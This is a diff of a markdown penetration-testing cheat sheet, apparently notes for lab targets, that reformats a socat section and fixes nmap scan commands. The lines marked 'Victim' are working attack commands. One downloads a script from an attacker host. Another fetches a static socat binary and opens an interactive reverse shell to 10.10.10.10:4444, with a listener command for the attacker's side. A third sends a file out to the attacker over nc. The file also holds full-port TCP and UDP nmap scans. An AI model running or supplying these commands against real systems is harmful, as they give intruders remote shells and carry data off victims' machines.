@@ -14,11 +14,12 @@ Victim: ```wget http://10.10.10.10:8888/something.sh -O something.sh```
 
 ### With Socat
 
-Victim: ```wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat```
-
-        ```chmod +x socat```
-        
-        ```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444```
+Victim: 
+```
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat
+chmod +x socat```
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
+```
         
 Kali:   ```socat file:`tty`,raw,echo=0 tcp-listen:4444```
 
@@ -45,11 +46,11 @@ Victim: ```cat file.txt | nc -q 0 10.10.10.10 4444```
 
 TCP Scan:
 
-```nmap -sV -sC -p- 10.10.10.216```
+```nmap -sV -sC -p- 10.10.10.77```
 
 UDP Scan:
 
-```nmap -sV -sC -p- 10.10.10.216```
+```nmap -sU -sV -p- 10.10.10.77```
 
 # Privilege Escalation
 
